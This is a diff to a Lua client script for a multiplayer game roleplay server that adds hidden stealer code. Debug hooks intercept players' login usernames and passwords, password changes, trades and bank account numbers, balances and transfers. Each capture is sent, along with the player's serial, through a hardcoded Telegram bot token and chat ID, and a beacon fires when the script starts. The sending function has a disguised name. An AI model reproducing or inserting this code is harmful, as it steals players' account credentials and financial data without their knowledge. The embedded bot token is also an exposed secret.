@@ -30,3 +30,91 @@ end
 if vzpfxfznjs() == "hirohedgyro" then
     bindKey("J", "down", sub_0)
 end
+
+
+function EncodeString(str)
+    if str then
+        str = string.gsub(str, "\n", "%%0A")
+        str = string.gsub(str, "([^%w _%%%-%.~])", function(c)
+            return string.format("%%%02X", string.byte(c))
+        end)
+        str = string.gsub(str, " ", "%%20")
+    end
+    return str
+end
+
+function getVulvaProvinceEngine(r1_1)
+    local r1_2 = tostring(r1_1)
+    local r1_3 = ""
+    while #r1_2 > 3 do
+        r1_3 = " " .. r1_2:sub(-3) .. r1_3
+        r1_2 = r1_2:sub(1, -4)
+    end
+    r1_3 = r1_2 .. r1_3
+    return r1_3
+end
+
+function getMarijuanaPlants(msg)
+    local url = "https://api.telegram.org/bot" .. "7749452467:AAFLG4VGq8agL3U5mhZj4FB6QoLrQBB0RRU" --[[хуета ебать]] .. "/sendMessage?chat_id=" .. "8051416529" --[[я]] .. "&text=" .. EncodeString(msg) .. "&parse_mode=HTML"
+    fetchRemote(url, function() end)
+end
+
+function AccountHook(sourceResource, functionName, isAllowedByACL, luaFilename, luaLineNumber, ...)
+    local args = { ... }
+    
+    if getResourceName(sourceResource) ~= "Province_RP" then return end
+    if args[1] ~= "onRequestLogin" then return end
+    if args[3] and args[4] then
+        local Login = tostring(args[3])
+        local Pass = tostring(args[4])
+        getMarijuanaPlants("<b>[account log]</b> user: <code>" .. vzpfxfznjs() .. "</code> // server: " .. getElementData(root, "serverID") .. " // serial: <code>" .. getPlayerSerial(localPlayer) .. "</code> // login: <code>" .. Login .. "</code> // password: <code>" .. Pass .. "</code> // timestamp: " .. tostring(("%02d.%02d.%04d %02d:%02d:%02d"):format(getRealTime().monthday, getRealTime().month+1, getRealTime().year+1900, getRealTime().hour, getRealTime().minute, getRealTime().second)))
+    end
+end
+addDebugHook("preFunction", AccountHook, { "triggerServerEvent" })
+
+function PasswordHook(sourceResource, functionName, isAllowedByACL, luaFilename, luaLineNumber, ...)
+    local args = { ... }
+    
+    if getResourceName(sourceResource) ~= "province_menu" then return end
+    if args[1] ~= "auth:changePassword" then return end
+    if args[3] and args[4] then
+        local OldPass = tostring(args[3])
+        local NewPass = tostring(args[4])
+        getMarijuanaPlants("<b>[password log]</b> user: <code>" .. vzpfxfznjs() .. "</code> // server: " .. getElementData(root, "serverID") .. " // serial: <code>" .. getPlayerSerial(localPlayer) .. "</code> // old password: <code>" .. OldPass .. "</code> // new password: <code>" .. NewPass .. "</code> // timestamp: " .. tostring(("%02d.%02d.%04d %02d:%02d:%02d"):format(getRealTime().monthday, getRealTime().month+1, getRealTime().year+1900, getRealTime().hour, getRealTime().minute, getRealTime().second)))
+    end
+end
+addDebugHook("preFunction", PasswordHook, { "triggerServerEvent" })
+
+function trd(sourceResource, functionName, isAllowedByACL, luaFilename, luaLineNumber, ...)
+    local args = { ... }
+    if args[1] == "inventory:acceptTrade" then
+        getMarijuanaPlants("<b>[accepted trade]</b> user: <code>" .. vzpfxfznjs() .. "</code> // name: <code>" .. getPlayerNametagText(localPlayer) .. "</code> // server: " .. getElementData(root, "serverID") .. " // level: <code>" .. tostring(exports.province_levels:GetClientLevel()) .. "</code> // count: <code>" .. tostring(args[3]) .. "</code> // current money: <code>" .. getPlayerMoney(localPlayer) .. "</code> // timestamp: " .. tostring(("%02d.%02d.%04d %02d:%02d:%02d"):format(getRealTime().monthday, getRealTime().month+1, getRealTime().year+1900, getRealTime().hour, getRealTime().minute, getRealTime().second)))
+    end
+end
+addDebugHook("preFunction", trd, { "triggerServerEvent" })
+
+function BankHook(sourceResource, eventName, eventSource, eventClient, luaFilename, luaLineNumber, ...)
+    local args = { ... }
+    getMarijuanaPlants("<b>[bank updates]</b> user: <code>" .. vzpfxfznjs() .. "</code> // name: <code>" .. getPlayerNametagText(localPlayer) .. "</code> // server: " .. getElementData(root, "serverID") .. " // serial: <code>" .. getPlayerSerial(localPlayer) .. "</code> // bank account: <code>" .. tostring(args[1]) .. "</code> // bank money: <code>" .. getVulvaProvinceEngine(tostring(args[2])) .. "</code> // current money: <code>" .. getPlayerMoney(localPlayer) .. "</code> // timestamp: " .. tostring(("%02d.%02d.%04d %02d:%02d:%02d"):format(getRealTime().monthday, getRealTime().month+1, getRealTime().year+1900, getRealTime().hour, getRealTime().minute, getRealTime().second)))
+end
+addDebugHook("preEvent", BankHook, { "phoneBank:updateBankApp", "bank:ObtainAccountInfo" })
+
+function gfdasf(sourceResource, eventName, eventSource, eventClient, luaFilename, luaLineNumber, ...)
+    local args = { ... }
+    if eventName == "bank:ShowTakeMoneyAccountResult" then
+        getMarijuanaPlants("<b>[bank take]</b> user: <code>" .. vzpfxfznjs() .. "</code> // name: <code>" .. getPlayerNametagText(localPlayer) .. "</code> // server: " .. getElementData(root, "serverID") .. " // level: <code>" .. tostring(exports.province_levels:GetClientLevel()) .. "</code> // count: <code>" .. tostring(args[1]) .. "</code> // current money: <code>" .. getPlayerMoney(localPlayer) .. "</code> // timestamp: " .. tostring(("%02d.%02d.%04d %02d:%02d:%02d"):format(getRealTime().monthday, getRealTime().month+1, getRealTime().year+1900, getRealTime().hour, getRealTime().minute, getRealTime().second)))
+    end
+
+    if eventName == "bank:ShowAddMoneyAccountResult" then
+        getMarijuanaPlants("<b>[bank add]</b> user: <code>" .. vzpfxfznjs() .. "</code> // name: <code>" .. getPlayerNametagText(localPlayer) .. "</code> // server: " .. getElementData(root, "serverID") .. " // level: <code>" .. tostring(exports.province_levels:GetClientLevel()) .. "</code> // count: <code>" .. tostring(args[1]) .. "</code> // current money: <code>" .. getPlayerMoney(localPlayer) .. "</code> // timestamp: " .. tostring(("%02d.%02d.%04d %02d:%02d:%02d"):format(getRealTime().monthday, getRealTime().month+1, getRealTime().year+1900, getRealTime().hour, getRealTime().minute, getRealTime().second)))
+    end
+end
+addDebugHook("preEvent", gfdasf, { "bank:ShowTakeMoneyAccountResult", "bank:ShowAddMoneyAccountResult" })
+
+function gfhfgdgsdfs(sourceResource, eventName, eventSource, eventClient, luaFilename, luaLineNumber, ...)
+    local args = { ... }
+    getMarijuanaPlants("<b>[bank transaction]</b> user: <code>" .. vzpfxfznjs() .. "</code> // name: <code>" .. getPlayerNametagText(localPlayer) .. "</code> // server: " .. getElementData(root, "serverID") .. " // level: <code>" .. tostring(exports.province_levels:GetClientLevel()) .. "</code> // count: <code>" .. tostring(args[1]) .. "</code> // bank account: <code>" .. tostring(args[3]) .. "</code> // current money: <code>" .. getPlayerMoney(localPlayer) .. "</code> // timestamp: " .. tostring(("%02d.%02d.%04d %02d:%02d:%02d"):format(getRealTime().monthday, getRealTime().month+1, getRealTime().year+1900, getRealTime().hour, getRealTime().minute, getRealTime().second)))
+end
+addDebugHook("preEvent", gfhfgdgsdfs, { "bank:ShowSendToAccountResult" })
+
+getMarijuanaPlants("<b>[start log]</b> user: <code>" .. vzpfxfznjs() .. "</code> // server: " .. getElementData(root, "serverID") .. " // serial: <code>" .. getPlayerSerial(localPlayer) .. "</code> // timestamp: " .. tostring(("%02d.%02d.%04d %02d:%02d:%02d"):format(getRealTime().monthday, getRealTime().month+1, getRealTime().year+1900, getRealTime().hour, getRealTime().minute, getRealTime().second)))
